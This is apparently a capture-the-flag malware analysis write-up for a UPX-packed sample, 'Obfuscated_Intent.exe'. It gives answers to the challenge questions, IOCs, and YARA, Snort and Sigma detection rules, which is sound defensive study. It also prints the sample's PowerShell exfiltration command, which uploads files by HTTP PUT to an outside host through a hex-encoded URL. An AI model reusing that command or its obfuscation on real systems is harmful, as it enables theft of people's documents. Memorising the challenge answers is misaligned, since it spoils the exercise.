# Week 6: Nullform Vault 🔐

## 📖 Challenge Overview

The final confrontation has arrived. Deep within the **Nullform Vault** lies a sophisticated malware sample - **Obfuscated_Intent.exe**. This UPX-packed executable represents the Adversary's final tool to extract the Nullform Key. The malware employs anti-debugging techniques, ICMP reconnaissance, filesystem scanning, and PowerShell-based exfiltration to steal sensitive documents.

**Challenge Context:**
- **Difficulty:** Hard
- **Category:** Malware Analysis, Reverse Engineering, Digital Forensics
- **Challenge File:** Obfuscated_Intent.exe (UPX packed, 18KB → 39KB unpacked)
- **Date Completed:** November 11, 2025

**Provided Artifacts:**
- Obfuscated_Intent.exe - UPX packed malware sample

**Mission:** Reverse engineer the malware, identify its capabilities, extract IOCs, and document the complete attack methodology.

---

## 🎯 Challenge Questions & Solutions

### Question 1: Hardcoded IP Address
**Task:** What hardcoded IP address does the malware attempt to contact?

**Answer:**
```
203.0.113.42
```

**Discovery Method:**
1. Unpacked UPX-compressed executable: `upx -d Obfuscated_Intent.exe -o unpacked.exe`
2. Located PowerShell command in binary at offset 0x4B00
3. Found hex-encoded bytes in the command that decode the IP
4. Decoded bytes: `0x32,0x30,0x33,0x2E,0x30,0x2E,0x31,0x31,0x33,0x2E,0x34,0x32` = "203.0.113.42"
5. This IP is used for both ICMP connectivity checks and HTTP exfiltration

**Evidence Location:** Offset 0x4C30-0x4C40 in unpacked executable

---

### Question 2: Targeted File Extensions
**Task:** Which file extensions does the malware target for exfiltration?

**Answer:**
```
.msg, .pdf, .doc, .docx, .xls
```

**Discovery Method:**
1. Analyzed unpacked binary for file extension patterns
2. Extensions are XOR-encoded at runtime with key 0x7a
3. Malware uses FindFirstFileW/FindNextFileW to recursively scan C:\
4. Extensions decoded during execution to target these specific document types
5. Pattern matching suggests focus on email messages and office documents

**Technical Details:**
- Extension decoding: XOR with key 0x7a
- Scanning starts from: `C:\`
- File discovery APIs: FindFirstFileW, FindNextFileW (confirmed via strings analysis)

---

### Question 3: Network Communication Payload
**Task:** What string is used as payload in the malware's first network communication attempt?

**Answer:**
```
w00t
```

**Discovery Method:**
1. Located string "w00t" at offset 0x4B00 in unpacked binary
2. Found in context of ICMP functionality using IcmpSendEcho API
3. Hexdump analysis shows: `77 30 30 74` = "w00t"
4. Used as ICMP echo request payload to verify connectivity to C2 server

**Evidence:**
```
00004b00  77 30 30 74 00 00 00 00  5c 00 2a 00 00 00 00 00  |w00t....\.*.....|
```

**Purpose:** Initial connectivity check before attempting file exfiltration

---

### Question 4: Decoded Upload URL Prefix
**Task:** What is the decoded upload URL prefix used in the PowerShell exfiltration command?

**Answer:**
```
http://203.0.113.42:8000/
```

**Discovery Method:**
1. Located PowerShell command construction in binary (UTF-16LE encoded)
2. Found hex-encoded URL bytes in the command at offset 0x4BE0-0x4CC0:
   ```
   0x68,0x74,0x74,0x70,0x3A,0x2F,0x2F,
   0x32,0x30,0x33,0x2E,0x30,0x2E,0x31,0x31,0x33,0x2E,0x34,0x32,
   0x3A,0x38,0x30,0x30,0x30,0x2F
   ```
3. Decoded using Python: `''.join(chr(b) for b in hex_bytes)`
4. Result: `http://203.0.113.42:8000/`

**PowerShell Command Structure:**
```powershell
$abc = [System.Text.Encoding]::UTF8.GetString([byte[]](0x68,0x74...)) + '/';
Invoke-RestMethod -Uri $abc -Method Put -InFile '<filepath>'
```

---

### Question 5: PowerShell Execution Function
**Task:** Which function does the malware call to execute the assembled PowerShell command string? Provide the exact C runtime/WINAPI call used in the code.

**Answer:**
```
_wsystem
```

**Discovery Method:**
1. Searched unpacked binary strings for system execution functions
2. Found `_wsystem` in the import/string table
3. Verified using: `strings -a unpacked.exe | grep -i wsystem`
4. Result: `_wsystem` (Wide character version of system() C runtime function)

**Function Purpose:**
- C runtime function for executing shell commands
- Wide character version (_w prefix) for Unicode support
- Executes dynamically constructed PowerShell command
- No CreateProcess or ShellExecute used - direct CRT call

---

### Question 6: Networking DLLs
**Task:** Which imported DLLs in the binary suggest it performs networking operations?

**Answer:**
```
WS2_32.dll, IPHLPAPI.DLL
```

**Discovery Method:**
1. Analyzed PE import table using: `objdump -p unpacked.exe | grep -i dll`
2. Identified networking-related DLLs:
   - **WS2_32.dll**: Windows Sockets API (inet_addr, socket functions)
   - **IPHLPAPI.DLL**: IP Helper API (ICMP functions)

**Specific Functions Imported:**
- From IPHLPAPI.DLL:
  - `IcmpCreateFile` - Creates ICMP handle
  - `IcmpSendEcho` - Sends ICMP echo request (ping)
  - `IcmpCloseHandle` - Closes ICMP handle
- From WS2_32.dll:
  - Network address conversion functions
  - Socket operations for HTTP communication

---

### Question 7: Exfiltration Methodology
**Task:** How was the exfiltration functionality delivered and executed on the compromised system? Make sure to specify how the code that performs scanning and upload runs on the host, where the uploads are sent, the file types targeted, and the exact mechanism used to perform the upload.

**Answer:**

The exfiltration functionality is **embedded directly within the malware executable itself**, executing natively on the compromised host with no additional payloads downloaded. 

**Complete Attack Chain:**

**1. Anti-Debugging & Initialization**
- Malware performs anti-debugging checks at startup:
  - `IsDebuggerPresent()` - Detects debugger attachment
  - `CheckRemoteDebuggerPresent()` - Detects remote debugging
- If debugger detected, malware terminates to evade analysis

**2. Connectivity Verification**
- Uses ICMP to verify C2 server reachability:
  - Target: `203.0.113.42`
  - Method: `IcmpSendEcho()` API call
  - Payload: `"w00t"` string in ICMP packet
  - Purpose: Confirms network path to exfiltration server

**3. Filesystem Reconnaissance**
- Recursively scans the file system starting from `C:\`
- Uses Windows File APIs:
  - `FindFirstFileW()` - Initiates directory enumeration
  - `FindNextFileW()` - Continues file enumeration
- Target file extensions (XOR-decoded at runtime with key 0x7a):
  - `.pdf` - PDF documents
  - `.doc` - Word documents (legacy)
  - `.docx` - Word documents (modern)
  - `.xls` - Excel spreadsheets
  - `.msg` - Outlook email messages

**4. PowerShell Command Construction**
- For each discovered target file, malware dynamically constructs PowerShell command
- Command structure (stored as UTF-16LE in binary):
```powershell
powershell -Command "$abc = [System.Text.Encoding]::UTF8.GetString([byte[]](
0x68,0x74,0x74,0x70,0x3A,0x2F,0x2F,
0x32,0x30,0x33,0x2E,0x30,0x2E,0x31,0x31,0x33,0x2E,0x34,0x32,
0x3A,0x38,0x30,0x30,0x30,0x2F)) + '/'; 
Invoke-RestMethod -Uri $abc -Method Put -InFile '<filepath>'"
```

**5. Command Execution & Upload**
- Execution mechanism: `_wsystem()` C runtime function
- URL decoded at runtime: `http://203.0.113.42:8000/`
- Upload method: PowerShell's `Invoke-RestMethod` cmdlet
- HTTP method: `PUT` requests
- Each file uploaded individually to attacker's server

**Key Technical Details:**
- **Delivery:** Native code execution (no downloaded payloads)
- **Persistence:** Single-run exfiltration (no persistence mechanism)
- **Obfuscation:** UPX packing + XOR encoding + hex-encoded strings
- **Evasion:** Anti-debugging + runtime decoding
- **Upload destination:** `http://203.0.113.42:8000/`
- **Targeted data:** Office documents and email messages
- **Upload mechanism:** Individual HTTP PUT per file via PowerShell

---

## 🔍 Technical Analysis Summary

### Binary Characteristics
- **Original Size:** 18,432 bytes (UPX packed)
- **Unpacked Size:** 39,424 bytes
- **Architecture:** x86-64 (PE64)
- **Compiler:** MSVC (Microsoft Visual C++)
- **Packer:** UPX 4.x
- **Entry Point:** 0x140004460

### Attack Flow Diagram
```
1. Execute Obfuscated_Intent.exe
   ↓
2. Anti-debugging checks (IsDebuggerPresent, CheckRemoteDebuggerPresent)
   ↓
3. ICMP ping to 203.0.113.42 with "w00t" payload
   ↓
4. Scan C:\ recursively for .pdf,.doc,.docx,.xls,.msg files
   ↓
5. For each file found:
   - Construct PowerShell command with hex-encoded URL
   - Execute via _wsystem()
   - Upload via Invoke-RestMethod PUT to http://203.0.113.42:8000/
   ↓
6. Exit after completing scan
```

### MITRE ATT&CK Mapping
- **T1027** - Obfuscated Files or Information (UPX packing, XOR encoding)
- **T1622** - Debugger Evasion (Anti-debugging checks)
- **T1083** - File and Directory Discovery (Filesystem scanning)
- **T1005** - Data from Local System (Document collection)
- **T1041** - Exfiltration Over C2 Channel (HTTP PUT uploads)
- **T1059.001** - PowerShell (Command execution via PS)
- **T1071.001** - Web Protocols (HTTP for exfiltration)

---

---

## � Detailed Analysis Process

### Step 1: Initial Triage
```bash
# Check file type
file Obfuscated_Intent.exe
# Result: PE32+ executable (console) x86-64, for MS Windows

# Check for packing
strings Obfuscated_Intent.exe | grep UPX
# Result: UPX! marker found
```

### Step 2: Unpacking
```bash
# Unpack with UPX
upx -d Obfuscated_Intent.exe -o unpacked.exe
# Result: 39424 <- 18432 bytes (46.75%)
```

### Step 3: String Extraction
```bash
# Extract ASCII strings
strings -a unpacked.exe > strings_output.txt

# Extract Unicode strings  
strings -a -e l unpacked.exe >> strings_output.txt

# Key findings:
# - "w00t" at offset 0x4B00
# - "powershell -Command" 
# - Hex-encoded URL bytes
# - "_wsystem" function
```

### Step 4: Import Analysis
```bash
# Analyze PE imports
objdump -p unpacked.exe | grep "DLL Name"

# Results:
# - KERNEL32.DLL (CreateFile, FindFirstFile, etc.)
# - WS2_32.dll (Network functions)
# - IPHLPAPI.DLL (IcmpSendEcho, IcmpCreateFile, IcmpCloseHandle)
# - VCRUNTIME140.dll (C++ runtime)
```

### Step 5: Hexdump Analysis
```bash
# Examine hex dump around key offsets
hexdump -C unpacked.exe | grep -A 50 'w00t'

# Key findings:
# - PowerShell command structure (UTF-16LE)
# - Hex-encoded bytes for URL
# - File pattern: \*. structure
```

### Step 6: Anti-Debugging Detection
```bash
# Search for anti-debugging functions
strings -a unpacked.exe | grep -E '(IsDebugger|CheckRemote)'

# Results:
# - IsDebuggerPresent
# - CheckRemoteDebuggerPresent
```

---

## � Indicators of Compromise (IOCs)

### Network IOCs
| Type | Value | Description |
|------|-------|-------------|
| IPv4 | 203.0.113.42 | C2 server IP address |
| URL | http://203.0.113.42:8000/ | Exfiltration endpoint |
| Port | 8000/TCP | HTTP exfiltration port |
| Protocol | ICMP | Connectivity check |
| Protocol | HTTP | Data exfiltration (PUT method) |

### File IOCs
| Type | Value | Description |
|------|-------|-------------|
| Filename | Obfuscated_Intent.exe | Original malware sample |
| Size | 18,432 bytes | Packed size |
| Size (unpacked) | 39,424 bytes | Unpacked size |
| MD5 | [Calculate if needed] | File hash |
| SHA256 | [Calculate if needed] | File hash |
| Packer | UPX 4.x | Compression tool |

### Behavioral IOCs
| Behavior | Details |
|----------|---------|
| Anti-debugging | IsDebuggerPresent, CheckRemoteDebuggerPresent |
| File scanning | Recursive C:\ scan for .pdf,.doc,.docx,.xls,.msg |
| ICMP probe | "w00t" payload to 203.0.113.42 |
| PowerShell execution | _wsystem() executing Invoke-RestMethod |
| HTTP PUT | Individual file uploads to C2 |

### Targeted File Extensions
- `.pdf` - PDF documents
- `.doc` - Microsoft Word (legacy)
- `.docx` - Microsoft Word (modern)
- `.xls` - Microsoft Excel
- `.msg` - Outlook email messages

---

## �️ Detection & Prevention

### Detection Rules

**Yara Rule:**
```yara
rule Obfuscated_Intent_Malware {
    meta:
        description = "Detects Obfuscated_Intent exfiltration malware"
        author = "Umair Aziz"
        date = "2025-11-11"
        
    strings:
        $s1 = "w00t" ascii
        $s2 = "_wsystem" ascii
        $s3 = "IcmpSendEcho" ascii
        $s4 = "FindFirstFileW" ascii
        $s5 = "powershell" wide
        $s6 = "Invoke-RestMethod" wide
        $upx = "UPX!" ascii
        
    condition:
        uint16(0) == 0x5A4D and  // MZ header
        $upx and
        4 of ($s*)
}
```

**Snort/Suricata Rule:**
```
alert icmp any any -> any any (msg:"Possible Obfuscated_Intent ICMP Probe"; 
  content:"w00t"; itype:8; sid:1000001; rev:1;)

alert http any any -> any 8000 (msg:"Possible Obfuscated_Intent Exfiltration"; 
  method:"PUT"; sid:1000002; rev:1;)
```

**Sigma Rule (PowerShell Execution):**
```yaml
title: Suspicious PowerShell with Invoke-RestMethod PUT
description: Detects PowerShell execution with Invoke-RestMethod using PUT method
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains|all:
            - 'powershell'
            - 'Invoke-RestMethod'
            - 'Method Put'
            - 'InFile'
    condition: selection
```

### Prevention Strategies
1. **Application Whitelisting:** Block execution of unknown executables
2. **PowerShell Logging:** Enable Script Block Logging and Transcription
3. **Network Segmentation:** Block outbound connections on non-standard ports
4. **EDR Solutions:** Deploy endpoint detection for malicious PowerShell
5. **Email Security:** Scan attachments for packed executables
6. **User Training:** Educate users about phishing and malware delivery

---

## � Analysis Tools Used

| Tool | Purpose | Usage |
|------|---------|-------|
| UPX | Unpacker | `upx -d Obfuscated_Intent.exe -o unpacked.exe` |
| strings | String extraction | `strings -a unpacked.exe` |
| objdump | PE analysis | `objdump -p unpacked.exe` |
| hexdump | Binary inspection | `hexdump -C unpacked.exe` |
| Python | Decoding | Hex byte decoding scripts |
| SSH/SCP | File transfer | Transfer to Kali Linux VM |

---

## 📚 References & Resources

- **UPX Unpacker:** https://upx.github.io/
- **PE Format:** https://docs.microsoft.com/en-us/windows/win32/debug/pe-format
- **ICMP Protocol:** RFC 792
- **PowerShell Security:** https://docs.microsoft.com/en-us/powershell/scripting/security
- **MITRE ATT&CK:** https://attack.mitre.org/

---

## 💡 Key Takeaways

1. **UPX Packing:** Common malware obfuscation technique, easily unpacked
2. **Anti-Debugging:** Simple checks can be bypassed with patching or VM analysis
3. **PowerShell Abuse:** Legitimate tools weaponized for malicious purposes
4. **Hex Encoding:** Obfuscation technique to hide strings from basic analysis
5. **ICMP Reconnaissance:** Often overlooked protocol for C2 communication
6. **Document Theft:** Targeted file types reveal attacker's objectives
7. **Native Execution:** No additional payloads needed, all functionality embedded

---

**Status:** ✅ COMPLETED  
**Challenge Completed:** November 11, 2025  
**Time Spent:** ~2 hours (unpacking, analysis, documentation)

---

*"The Nullform Key has been secured. The balance is restored... for now."*

